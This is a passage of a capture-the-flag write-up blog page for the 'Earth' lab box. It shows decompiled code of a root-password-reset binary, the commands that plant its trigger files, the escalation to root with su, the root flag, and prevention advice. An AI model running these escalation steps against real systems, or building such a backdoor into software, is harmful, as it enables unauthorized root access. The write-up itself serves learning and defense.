+<span class="giallo-l"><span>  local_38 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">810190e07090904</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_30 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">555c5d041c161d05</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_28 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">5e</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_78 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">69746e6564657263</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_70 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">746f6f7220736c61</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_68 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">747261456568743a</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_60 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">74616c66736968</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_c </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_1098 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">d064314000c5b</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_1090 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">27077310b2a194e</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_1088 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">75</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_10b8 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">d064314000c5b</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_10b0 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">620067075b15284e</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_10a8 </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 7</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_10c5 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">20061e4312081c5b</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_10bd </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">1b072551</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_10b9 </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  magic_cipher</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">&amp;</span><span>local_38</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;">&amp;</span><span>local_18</span><span style="color: #9399B2;">,</span><span>local_58</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">11</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">c</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span>  local_47 </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  puts</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;CHECKING IF RESET TRIGGERS PRESENT...&quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  magic_cipher</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">&amp;</span><span>local_1098</span><span style="color: #9399B2;">,</span><span>local_58</span><span style="color: #9399B2;">,</span><span>local_1078</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">11</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">12</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span>  local_1067 </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  iVar1 </span><span style="color: #94E2D5;">=</span><span style="color: #89B4FA;font-style: italic;"> access</span><span style="color: #9399B2;">(</span><span>local_1078</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  if</span><span style="color: #9399B2;"> (</span><span>iVar1 </span><span style="color: #94E2D5;">==</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">) {</span></span>
+<span class="giallo-l"><span>    local_c </span><span style="color: #94E2D5;">=</span><span> local_c </span><span style="color: #94E2D5;">+</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">  }</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  magic_cipher</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">&amp;</span><span>local_10b8</span><span style="color: #9399B2;">,</span><span>local_58</span><span style="color: #9399B2;">,</span><span>local_1078</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">11</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">12</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span>  local_1067 </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  iVar1 </span><span style="color: #94E2D5;">=</span><span style="color: #89B4FA;font-style: italic;"> access</span><span style="color: #9399B2;">(</span><span>local_1078</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  if</span><span style="color: #9399B2;"> (</span><span>iVar1 </span><span style="color: #94E2D5;">==</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">) {</span></span>
+<span class="giallo-l"><span>    local_c </span><span style="color: #94E2D5;">=</span><span> local_c </span><span style="color: #94E2D5;">+</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">  }</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  magic_cipher</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">&amp;</span><span>local_10c5</span><span style="color: #9399B2;">,</span><span>local_58</span><span style="color: #9399B2;">,</span><span>local_1078</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">d</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">12</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span>  local_106b </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  iVar1 </span><span style="color: #94E2D5;">=</span><span style="color: #89B4FA;font-style: italic;"> access</span><span style="color: #9399B2;">(</span><span>local_1078</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  if</span><span style="color: #9399B2;"> (</span><span>iVar1 </span><span style="color: #94E2D5;">==</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">) {</span></span>
+<span class="giallo-l"><span>    local_c </span><span style="color: #94E2D5;">=</span><span> local_c </span><span style="color: #94E2D5;">+</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">  }</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  if</span><span style="color: #9399B2;"> (</span><span>local_c </span><span style="color: #94E2D5;">==</span><span style="color: #FAB387;"> 3</span><span style="color: #9399B2;">) {</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">    puts</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth&quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">    setuid</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">    system</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;/usr/bin/echo </span><span style="color: #F5C2E7;">\&#39;</span><span style="color: #A6E3A1;">root:Earth</span><span style="color: #F5C2E7;">\&#39;</span><span style="color: #A6E3A1;"> | /usr/sbin/chpasswd&quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">  }</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  else</span><span style="color: #9399B2;"> {</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">    puts</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.&quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">  }</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  return</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span></code></pre>
+<p>So lets try to deconstruct this. So we know that the iVar1 is an int that acts like a bool of some type. Looking at the Unix C API we can see that access is to see if the application can access the file (<a rel="external" href="https://www.man7.org/linux/man-pages/man2/access.2.html">Linux Manual access</a>)
+So we can rename iVar1 to doesExist.
+Based on what we found out about magic cipher it looks like local_1078 is the output decrypted path for the program to check so we can just rename that to decryptedPath.
+We can also rename local_58 to pathDecryptionKey based on earlier discoveries. So lets change up the hex data to actual numbers so we can understand it a bit more.
+So after some looking we see that 0x11 equals to the number 17. 0xd also equals to 13 so we can change that one over.</p>
+<p>Now that we know those things let's see what the first decryption key is, eulbelap which in Unix everything is reversed so when we reverse it, it translates to paleblue.</p>
+<p>Which after some decoding we got the main key :3
+<code>thebluemarble1972</code></p>
+<h1 id="5-elevating-to-root">5. Elevating to Root</h1>
+<p>so the paths are</p>
+<ul>
+<li><code>/dev/shm/kHgTFI5G</code></li>
+<li><code>/dev/shm/Zw7bV9U5</code></li>
+<li><code>/tmp/kcM0Wewe</code></li>
+</ul>
+<p>so lets see if it works</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">sh-5.1$</span><span style="color: #A6E3A1;"> echo &quot;0&quot;</span><span style="color: #94E2D5;"> &gt;</span><span style="color: #A6E3A1;"> /dev/shm/kHgTFI5G</span></span>
+<span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">echo</span><span style="color: #A6E3A1;"> &quot;0&quot;</span><span style="color: #94E2D5;"> &gt;</span><span style="color: #A6E3A1;"> /dev/shm/kHgTFI5G</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">sh-5.1$</span><span style="color: #A6E3A1;"> echo &quot;0&quot;</span><span style="color: #94E2D5;"> &gt;</span><span style="color: #A6E3A1;"> /dev/shm/Zw7bV9U5</span></span>
+<span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">echo</span><span style="color: #A6E3A1;"> &quot;0&quot;</span><span style="color: #94E2D5;"> &gt;</span><span style="color: #A6E3A1;"> /dev/shm/Zw7bV9U5</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">sh-5.1$</span><span style="color: #A6E3A1;"> echo &quot;0&quot;</span><span style="color: #94E2D5;"> &gt;</span><span style="color: #A6E3A1;"> /tmp/kcM0Wewe</span><span>         </span></span>
+<span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">echo</span><span style="color: #A6E3A1;"> &quot;0&quot;</span><span style="color: #94E2D5;"> &gt;</span><span style="color: #A6E3A1;"> /tmp/kcM0Wewe</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">sh-5.1$</span><span style="color: #A6E3A1;"> reset_root</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">reset_root</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">CHECKING</span><span style="color: #A6E3A1;"> IF RESET TRIGGERS PRESENT...</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">RESET</span><span style="color: #A6E3A1;"> TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth</span></span></code></pre>
+<p>IT FREAKING WORKING :3</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">sh-5.1$</span><span style="color: #A6E3A1;"> su</span><span> </span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">su</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">Password:</span><span style="color: #A6E3A1;"> Earth</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9399B2;">[</span><span>root@earth /</span><span style="color: #9399B2;">]</span><span># </span></span></code></pre>
+<p>WE ARE FINALLY ROOT :3</p>
+<p>AND NOW WE GOT THE FINALLY KEY</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #9399B2;">[</span><span>root@earth /</span><span style="color: #9399B2;">]</span><span># cat /root/root_flag.txt</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">cat</span><span style="color: #A6E3A1;"> /root/root_flag.txt</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">              _-o#</span><span style="color: #9399B2;">&amp;&amp;</span><span style="color: #94E2D5;">*</span><span style="color: #A6E3A1;">&#39;&#39;&#39;&#39;</span><span style="color: #94E2D5;">?</span><span>d:</span><span style="color: #94E2D5;">&gt;</span><span>b</span><span style="color: #F5C2E7;">\_</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">          _o/&quot;</span><span style="color: #94E2D5;">`</span><span style="color: #89B4FA;font-style: italic;">&#39;&#39;</span><span style="color: #A6E3A1;">  &#39;&#39;</span><span style="color: #A6E3A1;font-style: italic;">,, dMF9MMMMMHo_</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">       .o</span><span style="color: #9399B2;">&amp;</span><span style="color: #9399B2;font-style: italic;">#&#39;        </span><span style="color: #94E2D5;">`</span><span style="color: #89B4FA;font-style: italic;">&quot;MbHMMMMMMMMMMMHo.</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">     .o&quot;&quot;</span><span style="color: #A6E3A1;"> &#39;         vodM*$&amp;&amp;HMMMMMMMMMM?.</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    ,&#39;</span><span>              $M</span><span style="color: #9399B2;">&amp;</span><span style="color: #89B4FA;font-style: italic;">ood,~&#39;`(&amp;##MMMMMMH\</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">   /               ,MMMMMMM#b?#bobMMMMHMMML</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  &amp;              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;"> ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">|               |MMMMMMMMMMMMMMMMMMMMbMH&#39;</span><span style="color: #A6E3A1;">   T,</span></span>
+<span class="giallo-l"><span>$H#:            </span><span style="color: #94E2D5;">`*</span><span style="color: #A6E3A1;">MMMMMMMMMMMMMMMMMMMMb#}&#39;  `?</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">]MMH#             &quot;&quot;*&quot;&quot;&quot;&quot;*#MMMMMMMMMMMMM&#39;    -</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">MMMMMb_</span><span style="color: #94E2D5;">                   |</span><span style="color: #89B4FA;font-style: italic;">MMMMMMMMMMMP&#39;     :</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">HMMMMMMMHo                 `MMMMMMMMMT       .</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">?MMMMMMMMP                  9MMMMMMMM}       -</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">-?MMMMMMM                  |MMMMMMMMM?,d-    &#39;</span></span>
+<span class="giallo-l"><span style="color: #F38BA8;font-style: italic;"> :</span><span style="color: #94E2D5;">|</span><span style="color: #89B4FA;font-style: italic;">MMMMMM-</span><span style="color: #94E2D5;">                 `</span><span style="color: #89B4FA;font-style: italic;">MMMMMMMT</span><span style="color: #A6E3A1;"> .M</span><span style="color: #94E2D5;">|</span><span style="color: #F38BA8;font-style: italic;">.</span><span style="color: #A6E3A1;">   :</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  .9MMM[</span><span style="color: #9399B2;">                    &amp;</span><span style="color: #89B4FA;font-style: italic;">MMMMM*&#39; `&#39;</span><span style="color: #A6E3A1;">    .</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">   :9MMk</span><span style="color: #94E2D5;">                    `</span><span style="color: #89B4FA;font-style: italic;">MMM#</span><span style="color: #A6E3A1;">&quot;        -</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">     &amp;</span><span style="color: #89B4FA;font-style: italic;">M}</span><span style="color: #94E2D5;">                     `</span><span style="color: #89B4FA;font-style: italic;">          .-</span></span>
+<span class="giallo-l"><span style="color: #94E2D5;">      `</span><span style="color: #9399B2;">&amp;</span><span style="color: #F38BA8;font-style: italic;">.</span><span style="color: #A6E3A1;">                             .</span></span>
+<span class="giallo-l"><span style="color: #94E2D5;">        `</span><span style="color: #89B4FA;font-style: italic;">~,</span><span style="color: #A6E3A1;">   .                     ./</span></span>
+<span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">            .</span><span style="color: #A6E3A1;"> _                  .-</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">              &#39;`--._,dd###pp=&quot;&quot;&#39;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">Congratulations</span><span style="color: #A6E3A1;"> on completing Earth!</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">If</span><span style="color: #A6E3A1;"> you have any feedback please contact me at SirFlash@protonmail.com</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">[</span><span>root_flag_b0da9554d29db2117b02aa8b66ec492e</span><span style="color: #9399B2;">]</span></span></code></pre>
+<p>YESSSSSSSSSS :3</p>
+<h1 id="final-notes">Final Notes</h1>
+<p>This was a pretty fun box to run through. To be honest the first time running through this box I thought it was broken forgetting about scanning for https. All around this is a fun box to mess with when trying to learn about hacking :3. I don't really recommend this to complete beginners sense you need some knowledge on Unix, reverse engineering, and encryption/encoding methods.</p>
+<p>All around this was a fun box to mess with. I'll prob mess with the Venus box next to see if I can break into that sense the dude who made these boxes said it's harder than this and the one before this in the series.</p>
+<h1 id="prevention">Prevention</h1>
+<ul>
+<li>First don't leave a test server connected to your server's IP address or domain. If you do don't leave testing notes that include a decryption key. Basic stuff like that left the system vulnerable from the start.</li>
+<li>Don't put the password to the admin panel on the website as a message even if it's encrypted.</li>
+<li>Don't leave a random admin panel to be able to be accessed on production servers.</li>
+<li>Don't have an executable file that resets the root, especially if it is something that anyone that has access to the shell can do.</li>
+</ul>
+<p>While this is a fictional and fun scenario to mess with. In a real scenario the hacker wouldn't be looking for random flags left on the system, they would be looking for login data, user data, and more ways to get further into the network. Leaving simple things like that open on the internet will cause many problems.</p>
+<p>Any ways,</p>
+<p>happy hacking :3
+<img src="/imgs/cats/oia-uia.gif" alt="cat :3" /></p>
+
+</article>
+
+<div id="overlay" onclick="closeOverlay();">
+    <div class="overlay-content" onclick="event.stopPropagation();">
+        <img id="overlay-img" src="">
+    </div>
+    <button id="overlay-close" onclick="closeOverlay();">X</button>
+</div>
+
+    </main>
+  </body>
+</html>
